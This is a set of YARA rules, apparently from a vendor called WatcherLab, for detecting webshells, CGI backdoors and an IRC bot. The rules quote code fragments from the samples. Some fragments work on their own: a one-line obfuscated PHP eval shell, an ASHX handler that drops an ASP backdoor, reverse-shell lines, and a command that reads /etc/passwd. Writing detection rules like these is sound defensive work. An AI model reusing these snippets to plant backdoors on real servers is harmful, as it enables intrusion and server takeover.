        $s12 = "print \"icmpsh - master\\n\";" fullword ascii
        $s13 = "#  (at your option) any later version." fullword ascii
        $s14 = "# set stdin to non-blocking" fullword ascii
        $s15 = "# compile and send response" fullword ascii
        $s16 = "fcntl(STDIN, F_SETFL, O_NONBLOCK) or die \"$!\";" fullword ascii
        $s17 = "#  GNU General Public License for more details." fullword ascii
        $s18 = "my $icmp = NetPacket::ICMP->decode($ip->{data});" fullword ascii
        $s19 = "#  This program is free software: you can redistribute it and/or modify" fullword ascii
        $s20 = "my $ip = NetPacket::IP->decode($buffer);" fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 6KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_7b0572d2b1dc44fcc7294f378a0fdd5807aaf587
{
    meta:
        description = "others - file 7b0572d2b1dc44fcc7294f378a0fdd5807aaf587.ashx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "6178209beb3577658091589f632615b84b51dc5afdbec2934275242ea5365f58"
    strings:
        $s1 = "file1.Write(\"<%response.clear:execute request(\\\"root\\\"):response.End%>\");" fullword ascii
        $s2 = "public void ProcessRequest (HttpContext context) {" fullword ascii
        $s3 = "StreamWriter file1= File.CreateText(context.Server.MapPath(\"root.asp\"));" fullword ascii
        $s4 = "context.Response.ContentType = \"text/plain\";" fullword ascii
        $s5 = "using System.Web;" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_26234fc9a54355f03663196a99affd9480f5684d
{
    meta:
        description = "others - file 26234fc9a54355f03663196a99affd9480f5684d.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "13519728df62cc1192ccc4405e1ac1115ad7885650e638bdcaabf6f9cd2bdac5"
    strings:
        $x1 = "<tr><td><form name=\"run\" method=\"POST\"><br><input type=text size=\"2\" id=\"sub3\" disabled value='\\$ '><input type=\"hidde" ascii
        $x2 = "print `$Command`;}if(!$WinNT){alarm(0);}print \"</pre>\";}print \"</font>\";&PrintCommandLineInputForm;&PrintPageFooter;}sub Sen" ascii
        $x3 = "print \"<table width=100%>\";print '<font face=\"Verdana\" size=\"1\">';$dbh = DBI->connect(\"DBI:mysql:$dbb:$hhost:$pport\",$us" ascii
        $x4 = "$tab='<table>';$tabe='</table>';$div='<div class=content><pre class=ml1>';$dive='</pre></div>';use Digest::MD5 qw(md5_hex);$WinN" ascii
        $x5 = "}sub ExecuteCommand1{if($RunCommand =~ m/^\\s*cd\\s+(.+)/gis){$CurrentDir=~s!\\Q//!/!g;if (!-r $1){$RunCommand=\"Can't read $1!" ascii
        $s6 = "print \"<table width=100%>\";print '<font face=\"Verdana\" size=\"1\">';$dbh = DBI->connect(\"DBI:mysql:$dbb:$hhost:$pport\",$us" ascii
        $s7 = "print \"<table width=100%>\";print '<font face=\"Verdana\" size=\"1\">';$dbh = DBI->connect(\"DBI:mysql:$dbb:$hhost:$pport\",$us" ascii
        $s8 = "dIn){&PerformLogin;}elsif($Action eq \"command\"){&ExecuteCommand;}elsif($Action eq \"RT\"){&RT;}elsif($Action eq \"view_file\")" ascii
        $s9 = "&PrintVar;}sub back{open(FILE,\">/tmp/bbc.pl\");$bbc = '#!/usr/bin/perl use IO::Socket;$system=\"/bin/bash\";use Socket;use File" ascii
        $s10 = "Cookies{'table'};&PrintPageHeader(\"c\");sql_vars_set();sql_loginform();$column=$in{'column'};print <<END;" fullword ascii
        $s11 = "hpv();$hosts=hosts();$downloaders=downloaders();&PrintPageHeader(\"c\");print \"<h1>System information</h1>\";print \"$div$tab<t" ascii
        $s12 = "&PrintVar;}sub ft($){my $Fchmod=perm($_[0]);my $owner=owner($_[0]);if (!-w $_[0]){$wr='<font color=#FF0000>  Not writable</font>" ascii
        $s13 = "}sub PrintLoginForm{print \"<center><form name=f method=POST><input type=password name=p><input type=submit value='>>'></form></" ascii
        $s14 = "q{u});return $s;}sub downloaders{$s=\"which lynx links wget GET fetch curl\";$s.=\" -U $q{u}\"if($q{u});return $s;}sub httpd{$s=" ascii
        $s15 = "</td><td width=1 align=right><nobr><span>Server IP:</span><br>$ENV{'SERVER_ADDR'}<br><span>Client IP:</span><br>$ENV{'REMOTE_ADD" ascii
        $s16 = "}sub sql{use DBI;&PrintPageHeader(\"p\");sql_loginform();sql_query_form();&PrintVar;&PrintPageFooter;}sub sql_vars_set{$hhost=$i" ascii
        $s17 = "open(FFF,\"> $ffpath\");print FFF DeHtmlSpecialChars($fccode);close(FFF);&PrintVar;&PrintPageFooter;}sub sql_columns{&GetCookies" ascii
        $s18 = "<form name='sf' method='post'><table cellpadding='2' cellspacing='0'><tr><td>Type</td><td>Host</td><td>Port</td><td>Login</td><t" ascii
        $s19 = "ookie: last_command=;\\n\";print \"Content-type: text/html\\n\\n\";&PrintLoginForm;}sub PerformLogin{if(md5_hex($LoginPassword) " ascii
        $s20 = "<form name='sf' method='post'><table cellpadding='2' cellspacing='0'><tr><td>Type</td><td>Host</td><td>Port</td><td>Login</td><t" ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule f9b9b3cdb3e9a11e528aed1ef68182a0140a4b8d
{
    meta:
        description = "others - file f9b9b3cdb3e9a11e528aed1ef68182a0140a4b8d.Jpg"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "27c8aec29a8312a15eb47b233904396dfacc06013d02e12a4d5b9efdba746f68"
    strings:
        $x1 = "return new String(inutStreamToOutputStream(Runtime.getRuntime().exec(cmd).getInputStream()).toByteArray(),encoding);" fullword ascii
        $s2 = "out.write((\"User:\\t\"+exec(\"whoami\")).getBytes());" fullword ascii
        $s3 = "shell(request.getParameter(\"host\"), Integer.parseInt(request.getParameter(\"port\")));" fullword ascii
        $s4 = "out.println(exec(request.getParameter(\"cmd\")));" fullword ascii
        $s5 = "public static void shell(String host,int port) throws UnknownHostException, IOException{" fullword ascii
        $s6 = "out.println(auto(request.getParameter(\"url\"),request.getParameter(\"fileName\"),request.getParameter(\"cmd\")));" fullword ascii
        $s7 = "out.write(exec(new String(b,0,a,\"UTF-8\").trim()).getBytes(\"UTF-8\"));" fullword ascii
        $s8 = "encoding = isNotEmpty(getSystemEncoding())?getSystemEncoding():encoding;" fullword ascii
        $s9 = "download(request.getParameter(\"url\"), request.getParameter(\"path\"));" fullword ascii
        $s10 = "public static String auto(String url,String fileName,String cmd) throws MalformedURLException, IOException{" fullword ascii
        $s11 = "public static void download(String url,String path) throws MalformedURLException, IOException{" fullword ascii
        $s12 = "public static String exec(String cmd) {" fullword ascii
        $s13 = "return System.getProperty(\"sun.jnu.encoding\");" fullword ascii
        $s14 = "copyInputStreamToFile(new URL(url).openConnection().getInputStream(), path);" fullword ascii
        $s15 = "* @throws UnknownHostException" fullword ascii
        $s16 = "String out = exec(cmd);" fullword ascii
        $s17 = "* @param host" fullword ascii
        $s18 = "cmd /c dir " fullword ascii
        $s19 = "* @param cmd" fullword ascii
        $s20 = "public static String getSystemEncoding(){" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 10KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _home_chenzhongxiang_test_webshell_sample_others_l
{
    meta:
        description = "others - file l.jpg"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "df4fd1e10aa680c9be214bb57ea76e9a6e9628bc7e99889905fde29187c9f139"
    strings:
        $s1 = "<!-- M0B shell -->" fullword ascii
        $s2 = "echo\" <a href=$userfile_name><center><b>Sucess Upload :D ==> $userfile_name</b></center></a>\";" fullword ascii
        $s3 = "@move_uploaded_file($userfile_tmp, $qx);" fullword ascii
        $s4 = "echo \"<center><b>Uname:\".php_uname().\"<br></b>\"; " fullword ascii
        $s5 = "$userfile_tmp = $_FILES['image']['tmp_name'];" fullword ascii
        $s6 = "if($_GET['X']==\"M0B\"){" fullword ascii
        $s7 = "$userfile_name = $_FILES['image']['name'];" fullword ascii
        $s8 = "if(isset($_POST['Submit'])){" fullword ascii
        $s9 = "echo'<form method=\"POST\" action=\"#\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"image\"><br><input type=\"Su" ascii
    condition:
        ( uint16(0) == 0x683c and filesize < 2KB and ( all of them ) ) or ( all of them )
}

rule sig_2ee42ce594ea271c21c80370e2b395ac8f62d2da
{
    meta:
        description = "others - file 2ee42ce594ea271c21c80370e2b395ac8f62d2da.cgi"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "1f538da37a99b92a164da07197595d708ef5682dda21037bfe46cd00daae862b"
    strings:
        $x1 = "print \"Usage: http://target.com/perlcmd.cgi?cat /etc/passwd\";" fullword ascii
        $s2 = "print '<!-- Simple CGI backdoor by DK (http://michaeldaw.org) -->';" fullword ascii
        $s3 = "# <!--    http://michaeldaw.org   2006    -->" fullword ascii
        $s4 = "print \"Executing: $req\";" fullword ascii
        $s5 = "foreach my $line (@cmd) {" fullword ascii
        $s6 = "my @cmd = `$req`;" fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 1KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule new1line_php
{
    meta:
        description = "others - file new1line.php.jpg"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "46d038dd90a471204c47f65bcb05b80a8b0a1e2a48f33afa2b842bad70d8093f"
    strings:
        $s1 = "<?php ($b = $_POST['c']) && @preg_replace('/ad/e','@'.str_rot13('riny').'($b)', 'add');?>" fullword ascii
    condition:
        ( uint16(0) == 0x3f3c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_5fce386d1e749899d1894c434f1a743012d83d88
{
    meta:
        description = "others - file 5fce386d1e749899d1894c434f1a743012d83d88.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5632be4980b0c473058626e219bb4012d2f081e66829190396e027d80dd8568d"
    strings:
        $s1 = "my $shell = '/bin/bash -i';   " fullword ascii
        $s2 = "#!/usr/bin/perl -w   " fullword ascii
        $s3 = "print \"Enjoy the shell.\\n\";             " fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 2KB and ( all of them ) ) or ( all of them )
}

rule sig_29c31577c666e47da58fe3f6255eaae32dcb9f53
{
    meta:
        description = "others - file 29c31577c666e47da58fe3f6255eaae32dcb9f53.jpg"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "64198dff4b40fa415ca860d863bf23bf1c30b5cf5fed5964b13529e784d89a51"
    strings:
        $x1 = "for(int i=0; i&lt;d.length();i+=2){os.write((h.indexOf(d.charAt(i)) &lt;&lt; 4 | h.indexOf(d.charAt(i+1))));}os.close();}void HH" ascii
        $s2 = "ubstring(0,2),z2};Process p=Runtime.getRuntime().exec(c);MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);}else if(Z.equals(" ascii
        $s3 = "for(int k=0; k &lt; x.length; k++){if(!x[k].delete()){EE(x[k].getPath());}}}f.delete();}void FF(String s,HttpServletResponse" fullword ascii
        $s4 = "String EC(String s)throws Exception{return new String(s.getBytes(\"ISO-8859-1\"),cs);}Connection GC(String s)throws Exception{" fullword ascii
        $s5 = "nt m=c.createStatement(1005,1007);ResultSet r=m.executeQuery(\"select * from \"+x[x.length-1]);ResultSetMetaData d=r.getMetaData" ascii
        $s6 = "for(int i=0; i&lt;d.length();i+=2){os.write((h.indexOf(d.charAt(i)) &lt;&lt; 4 | h.indexOf(d.charAt(i+1))));}os.close();}voi" fullword ascii
        $s7 = "Statement(1005,1008);BufferedWriter bw=null;try{ResultSet r=m.executeQuery(q.indexOf(\"--f:\")!=-1?q.substring(0,q.indexOf(\"--f" ascii
        $s8 = "nd(\"ERROR\"+\":// \"+e.toString());}sb.append(\"|\"+\"&lt;-\");out.print(sb.toString());</jsp:scriptlet></jsp:root>" fullword ascii
        $s9 = "while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}os.write((\"|\"+\"&lt;-\").getBytes(),0,3);" fullword ascii
        $s10 = "ServletOutputStream os=r.getOutputStream();BufferedInputStream is=new BufferedInputStream(new FileInputStream(s));" fullword ascii
        $s11 = "if(x.length>4){c.setCatalog(x[4]);}return c;}}void AA(StringBuffer sb)throws Exception{File r[]=File.listRoots();" fullword ascii
        $s12 = "//http://www.gslypx.com/oo.jspx?z0=utf-8" fullword ascii
        $s13 = "<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:c=\"http://java.sun.com/jsp/js" ascii
        $s14 = "<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:c=\"http://java.sun.com/jsp/js" ascii
        $s15 = "for(int i=0;i&lt;r.length;i++){sb.append(r[i].toString().substring(0,2));}}void BB(String s,StringBuffer sb)throws Exception" fullword ascii
        $s16 = "\\t\"+l[i].length()+\"\\t\"+sQ+\"\\n\";}}sb.append(sF);}void EE(String s)throws Exception{File f=new File(s);" fullword ascii
        $s17 = "close();}}catch(Exception e){sb.append(\"Result\\t|\\t\\r\\n\");try{m.executeUpdate(q);sb.append(\"Execute Successfully!\\t|\\t" ascii
        $s18 = "ection h=(HttpURLConnection) u.openConnection();InputStream is=h.getInputStream();byte[] b=new byte[512];while((n=is.read(b))!=-" ascii
        $s19 = "for(int i=0; i&lt;l.length; i++){dt=new java.util.Date(l[i].lastModified());" fullword ascii
        $s20 = "<jsp:directive.page contentType=\"text/html\" pageEncoding=\"UTF-8\" />" fullword ascii
    condition:
        ( uint16(0) == 0x6a3c and filesize < 20KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

/* Super Rules ------------------------------------------------------------- */

rule _035b5e64aadb14237890bb3df89195acb33eb192_6c89518d396cd10af0b5ff5da427b46364daa2d1_0
{
    meta:
        description = "others - from files 035b5e64aadb14237890bb3df89195acb33eb192.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d3e9d59062a9ae2bfc20bf0acdbb83605c8463cca7452d7dcf0922abaeb90552"
        hash2 = "c59cfa764203cab72c7c60554fdbeabac4a9025ce79c6c9770fe5e4d86c84be6"
    strings:
        $x1 = "$system = ($unix)?('echo \"`uname -a`\";echo \"`id`\";/bin/sh'):('cmd.exe'); " fullword ascii
        $x2 = "$SHELL=($unix)?('/bin/bash -i'):('cmd.exe');  " fullword ascii
        $s3 = "print \"<HTML><TITLE>r57pws - login</TITLE><BODY><div align=center><font face=verdana size=1>\";" fullword ascii
        $s4 = "($ENV{'CONTENT_TYPE'} =~ /multipart\\/form-data; boundary=(.+)$/)?(&get_file($1)):(&get_val());" fullword ascii
        $s5 = "<noscript><a href=http://click.hotlog.ru/?81606 target=_top><imgsrc=\"http://hit4.hotlog.ru/cgi-bin/hotlog/count?s=81606&im=1\" " ascii
        $s6 = "<script language=\"javascript1.3\">hotlog_js=\"1.3\"</script><script language=\"javascript\">hotlog_r+=\"&js=\"+hotlog_js;docume" ascii
        $s7 = "<noscript><a href=http://click.hotlog.ru/?81606 target=_top><imgsrc=\"http://hit4.hotlog.ru/cgi-bin/hotlog/count?s=81606&im=1\" " ascii
        $s8 = "if($FORM{PASS} eq $password) { print \"Set-Cookie: PASS=\".cry($FORM{PASS}).\";\\nContent-type: text/html\\n\\n<meta HTTP-EQUIV=" ascii
        $s9 = "<title>$script_name - Perl Web Shell by RST/GHC</title>" fullword ascii
        $s10 = "(\"<a href='http://click.hotlog.ru/?81606' target='_top'><img \"+\" src='http://hit4.hotlog.ru/cgi-bin/hotlog/count?\"+hotlog_r+" ascii
        $s11 = "if(!$COOK{PASS}||($COOK{PASS} ne cry($password))) { &form_login; exit(); } " fullword ascii
        $s12 = "print $sock \"GET $path HTTP/1.0\\nHost: $server\\n\\n\";" fullword ascii
        $s13 = "'find config* files in current dir' => 'find . -type f -name \"config*\"'," fullword ascii
        $s14 = "'find config.inc.php files in current dir' => 'find . -type f -name config.inc.php'," fullword ascii
        $s15 = "=\"http://ghc.ru\" target=_blank>http://ghc.ru</a></font> ]};" fullword ascii
        $s16 = "'target=_blank><img src=\"http://counter.yadro.ru/hit?t52.6;r'+" fullword ascii
        $s17 = "&input('text','FILE','http://server.com/file.txt',49,undef);" fullword ascii
        $s18 = "$iaddr=inet_aton($target) || die(\"Error: $!\\n\"); " fullword ascii
        $s19 = "if($FORM{PASS} eq $password) { print \"Set-Cookie: PASS=\".cry($FORM{PASS}).\";\\nContent-type: text/html\\n\\n<meta HTTP-EQUIV=" ascii
        $s20 = "## - port bind" fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 60KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _1bae465ddef9bb5db4e2d4c17622e97aff33e173_1ded8770d26dbadd27c70807df5b3f75e4f88856_1
{
    meta:
        description = "others - from files 1bae465ddef9bb5db4e2d4c17622e97aff33e173.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c55e1bff6eb816dd9cc966c5d5d99236a724bd7cdb4d0595b32ec6cefbc19cf0"
        hash2 = "ab8521708c6b9b092534d2f1c2b665da18af452ffbf998d0a351dc8150d61f2a"
    strings:
        $s1 = "sendraw(\"USER $ircname \".$IRC_socket->sockhost.\" $servidor_con :$realname\");" fullword ascii
        $s2 = "# esse 'sub fixaddr' daki foi pego do NET::IRC::DCC identico soh copiei e coloei (colokar nome do autor)" fullword ascii
        $s3 = "return inet_ntoa(((gethostbyname($address))[4])[0]);" fullword ascii
        $s4 = "sendraw($IRC_cur_socket,\"PRIVMSG $printl :Nenhuma porta aberta foi encontrada\"); " fullword ascii
        $s5 = "while (!(keys(%irc_servers))) { conectar(\"$nick\", \"$servidor\", \"$porta\"); }" fullword ascii
        $s6 = "my $dccsock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>$dccip, PeerPort=>$dccporta, Timeout=>15) or return (0);" fullword ascii
        $s7 = "my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => 4);" fullword ascii
        $s8 = "$irc_servers{$IRC_cur_socket}{'host'} = \"$servidor_con\";" fullword ascii
        $s9 = "$irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;" fullword ascii
        $s10 = "sendraw($IRC_cur_socket, \"PRIVMSG $printl :portas abertas: @aberta\");" fullword ascii
        $s11 = "$irc_servers{$IRC_cur_socket}{'porta'} = \"$porta_con\";" fullword ascii
        $s12 = "return(\"$sock_tipo\",\"$status\",\"$nick\",\"$arquivo\",\"$bytes_total\", \"$cur_byte\",\"$d_time\", \"$rate\", \"$porcen\");" fullword ascii
        $s13 = "} elsif ($address =~ /^[12]?\\d{1,2}\\.[12]?\\d{1,2}\\.[12]?\\d{1,2}\\.[12]?\\d{1,2}$/) {" fullword ascii
        $s14 = "$0=\"$processo\".\"\\0\"x16;;" fullword ascii
        $s15 = "if ($nread == 0 and $dcctipo =~ /^(get|sendcon)$/) {" fullword ascii
        $s16 = "$sendsock = IO::Socket::INET->new(Listen=>1, LocalPort =>$porta, Proto => 'tcp') and $dcc_sel->add($sendsock);" fullword ascii
        $s17 = "delete($irc_servers{''}) if (defined($irc_servers{''}));" fullword ascii
        $s18 = "sendraw(\"MODE $_[0] -o $_[1]\");" fullword ascii
        $s19 = "sendraw(\"MODE $_[0] -b $_[1]\");" fullword ascii
        $s20 = "sendraw(\"MODE $_[0] -v $_[1]\");" fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 60KB and ( 8 of them ) ) or ( all of them )
}

rule _3610fffd9262dae60e57703b7a2aab8cdcdb98aa_72e5f0e4cd438e47b6454de297267770a36cbeb3_e84e1dd1528868428ef1374ac5216baaca6e2976__2
{
    meta:
        description = "others - from files 3610fffd9262dae60e57703b7a2aab8cdcdb98aa.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "8f2ebda4d0ce8f8ca9e4003a4b4f63d641051af87dcbcdc05f86f64ce047c49b"
        hash2 = "1cd2344239867b8e98c79df7a39f59f567d131ff5445950c767f167523b4fdf1"
        hash3 = "1e06d7dad7ba1d7f5501a76fa0cba1fc61554d585b5bce165069726599d111e4"
        hash4 = "38b4f6ada23eea46019dd175da0225bb059bac6495236cb3f24caee2e8a42877"
    strings:
        $s1 = "# displays a page that allows the user to run commands. If the password doens't" fullword ascii
        $s2 = "# an internal variable and is used each time a command has to be executed. The" fullword ascii
        $s3 = "$HtmlMetaHeader = \"<meta HTTP-EQUIV=\\\"Refresh\\\" CONTENT=\\\"1; URL=$DownloadLink\\\">\";" fullword ascii
        $s4 = "# get the directory in which the commands will be executed" fullword ascii
        $s5 = "# CGI-Telnet Version 1.0 for NT and Unix : Run Commands on your Web Server" fullword ascii
        $s6 = "# Main Program - Execution Starts Here" fullword ascii
        $s7 = "# Script Homepage: http://www.rohitab.com/cgiscripts/cgitelnet.html" fullword ascii
        $s8 = "# output of the change directory command is not displayed to the users" fullword ascii
        $s9 = "# This function is called to execute commands. It displays the output of the" fullword ascii
        $s10 = "# Product Support: http://www.rohitab.com/support/" fullword ascii
        $s11 = "# Configuration: You need to change only $Password and $WinNT. The other" fullword ascii
        $s12 = "# Author e-mail: rohitab@rohitab.com" fullword ascii
        $s13 = "# Author Homepage: http://www.rohitab.com/" fullword ascii
        $s14 = "# Prints the message that informs the user of a failed login" fullword ascii
        $s15 = "&ExecuteCommand;" fullword ascii
        $s16 = "# 2. Change the password in the Configuration section below." fullword ascii
        $s17 = "# command and allows the user to enter another command. The change directory" fullword ascii
        $s18 = "<a href=\"http://www.rohitab.com/cgiscripts/cgitelnet.html\">Help</a>" fullword ascii
        $s19 = "sub ExecuteCommand" fullword ascii
        $s20 = "# Discussion Forum: http://www.rohitab.com/discuss/" fullword ascii
    condition:
        ( uint16(0) == 0x2123 and filesize < 80KB and ( 8 of them ) ) or ( all of them )
}

rule _483911a0938f08984f634daf82a573b75162a2ff_f1909a6e495b025b252194daac354c72d0a597d8_3
{
    meta:
        description = "others - from files 483911a0938f08984f634daf82a573b75162a2ff.java"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5658a2c5b43285c407267be9f54d545eb346e37b7f314c276550b9a600463929"
        hash2 = "bb0ba3a3d07fd6a3d68ac536f4ad0fe2daf94abcb4d78bae4cb7a96bb35d1a5e"
    strings:
        $s1 = "ResultSet r = m.executeQuery(q.indexOf(\"--f:\")!=-1?q.substring(0,q.indexOf(\"--f:\")):q);" fullword ascii
        $s2 = "Process p = Runtime.getRuntime().exec(c);" fullword ascii
        $s3 = "ResultSet r = m.executeQuery(\"select * from \" + x[x.length-1]);" fullword ascii
        $s4 = "public void doPost(HttpServletRequest request, HttpServletResponse response)throws ServletException, IOException {" fullword ascii
        $s5 = "sb.append(\"Execute Successfully!\\t|\\t\\r\\n\");" fullword ascii
        $s6 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()+ \"\\t\" + sQ + \"\\n\");" fullword ascii
        $s7 = "ResultSet r = s.indexOf(\"jdbc:oracle\")!=-1?c.getMetaData().getSchemas():c.getMetaData().getCatalogs();" fullword ascii
        $s8 = "cs = request.getParameter(\"z0\") != null ? request.getParameter(\"z0\")+ \"\":cs;" fullword ascii
        $s9 = "sF+=l[i].getName() + \"\\t\" + sT + \"\\t\" + l[i].length() + \"\\t\"+ sQ + \"\\n\";" fullword ascii
        $s10 = "sb.append(d.getColumnName(i) + \" (\" + d.getColumnTypeName(i)+ \")\\t\");" fullword ascii
        $s11 = "os.write((h.indexOf(d.charAt(i)) << 4 | h.indexOf(d.charAt(i + 1))));" fullword ascii
        $s12 = "public void doGet(HttpServletRequest request, HttpServletResponse response)" fullword ascii
        $s13 = "xOf(\"--f:\") + 4,q.length()).trim()),true),cs));" fullword ascii
        $s14 = "m.executeUpdate(q);" fullword ascii
        $s15 = "String s = request.getSession().getServletContext().getRealPath(\"/\");" fullword ascii
        $s16 = "HH(s + \"/\" + z[j].getName(), d + \"/\" + z[j].getName());" fullword ascii
        $s17 = "sb.append(r.getString(\"TABLE_NAME\") + \"\\t\");" fullword ascii
        $s18 = "BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));" fullword ascii
        $s19 = "String z1 = EC(request.getParameter(\"z1\") + \"\");" fullword ascii
        $s20 = "String z2 = EC(request.getParameter(\"z2\") + \"\");" fullword ascii
    condition:
        ( uint16(0) == 0x6170 and filesize < 30KB and ( 8 of them ) ) or ( all of them )
}

rule _2db1b4ebaf31a105231b7f3fef7d1fb9b6b3d0fb_bb9f82930f273fe5ea001f2d0481e07b9ca08cff_df72eb8e6817464c16e0eb2b987a9cadcd1c4914__4
{
    meta:
        description = "others - from files 2db1b4ebaf31a105231b7f3fef7d1fb9b6b3d0fb.soap"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "6a0578b389fa8db8c4cb87236c14d470855fa742909dd5bb51a61bb04b0e371a"
        hash2 = "a13cbf03be78b855d6bb3abc537a9a51d7eadb172c4e144de31dc0b4ef0f87f5"
        hash3 = "048962b1d72b71052809139c798d72297bf139782679c0922dc69c578e558119"
        hash4 = "5c533563dd8f6d629c161a3ffd5818a00f4a80e823959cdddb51b8c8fe1598ec"
    strings:
        $s1 = "R += String.Format(\"{0}/\\t{1}\\t0\\t-\\n\", D.Name, File.GetLastWriteTime(Z1 + D.Name).ToString(\"yyyy-MM-dd hh:mm:ss\"));" fullword ascii
        $s2 = "R = \"Result\\t|\\t\\r\\nExecute Successfully!\\t|\\t\\r\\n\";" fullword ascii
        $s3 = "if (strDat.IndexOf(\"SELECT \") == 0 || strDat.IndexOf(\"EXEC \") == 0 || strDat.IndexOf(\"DECLARE \") == 0)" fullword ascii
        $s4 = "cm.ExecuteNonQuery();" fullword ascii
        $s5 = "ProcessStartInfo c = new ProcessStartInfo(Z1.Substring(2));" fullword ascii
        $s6 = "c.UseShellExecute = false;" fullword ascii
        $s7 = "[WebService(Namespace = \"http://www.wooyun.org/whitehats/RedFree\")]" fullword ascii
        $s8 = "HttpWebResponse WB = (HttpWebResponse)RQ.GetResponse();" fullword ascii
        $s9 = "SqlCommand cm = Conn.CreateCommand();" fullword ascii
        $s10 = "cm.CommandText = Z2;" fullword ascii
        $s11 = "Process e = new Process();" fullword ascii
        $s12 = "File.Copy(S + \"\\\\\" + F.Name, D + \"\\\\\" + F.Name);" fullword ascii
        $s13 = "[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]" fullword ascii
        $s14 = "R = Conn.Database + \"\\t\";" fullword ascii
        $s15 = "using System.Web.Services.Protocols;" fullword ascii
        $s16 = "DataTable dt = Conn.GetSchema(\"Columns\");" fullword ascii
        $s17 = "DataTable dt = Conn.GetSchema(\"Columns\", p);" fullword ascii
        $s18 = "R = String.Format(\"{0}\\t\", HttpContext.Current.Server.MapPath(\"/\"));" fullword ascii
        $s19 = "R += String.Format(\"{0}\\t{1}\\t{2}\\t-\\n\", D.Name, File.GetLastWriteTime(Z1 + D.Name).ToString(\"yyyy-MM-dd hh:mm:ss\"), D.L" ascii
        $s20 = "using System.Web.SessionState;" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 40KB and ( 8 of them ) ) or ( all of them )
}

rule _4b2ee85bb53225354eb84536035bb40b2ef945a8_db74302278d2bfd5a1f48e95bf04ff579587620f_5
{
    meta:
        description = "others - from files 4b2ee85bb53225354eb84536035bb40b2ef945a8.pl"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a5a40d319b3235fe2476d4c2d0f719a5fd2b4958edc0aa5e9bed9422ff819d19"
        hash2 = "077754d01e8d537c6ac3fb69c25c7397c4c34fe5a4462727b0814af2381a67fa"
    strings:
        $s1 = "ter;}sub sql_databases{sql_vars_set();&PrintPageHeader(\"c\");sql_vars_set();sql_loginform();$ddb=$in{'database'};print <<END;" fullword ascii
        $s2 = "ookies{'passs'};$dbb=$Cookies{'dbb'};&PrintPageHeader(\"c\");sql_vars_set();sql_loginform();$qqquery=$in{'table'};print <<END;" fullword ascii
        $s3 = "print \"$tbb$verd\";$dbh=DBI->connect(\"DBI:mysql:$dbb:$hhost:$pport\",$usser,$passs);$sth=$dbh->prepare('SHOW DATABASES');$sth-" ascii
        $s4 = "print \"$tbb$verd\";$dbh=DBI->connect(\"DBI:mysql:$dbb:$hhost:$pport\",$usser,$passs);$sth=$dbh->prepare(\"SHOW DATABASES\");$st" ascii
        $s5 = "open(FFF,\"> $ffpath\");print FFF DeHtmlSpecialChars($fccode);close(FFF);&PrintVar;&PrintPageFooter;}sub jquery{print '<script>d" ascii
        $s6 = "ument.querys.query.value=\"'.$zapros.'\";</script>';}sub sql_columns{&GetCookies;$hhost=$Cookies{'hhost'};$pport=$Cookies{'pport" ascii
        $s7 = "n{'query'};}$dbh=DBI->connect(\"DBI:mysql:$dbb:$hhost:$pport\",$usser,$passs);$sth=$dbh->prepare(\"SHOW DATABASES\");$sth->execu" ascii
        $s8 = "(\"c\");sql_loginform();sql_vars_set();$s4et=0;$dbb=\"\";$dbh=DBI->connect(\"DBI:mysql:$dbb:$hhost:$pport\",$usser,$passs);if($h" ascii
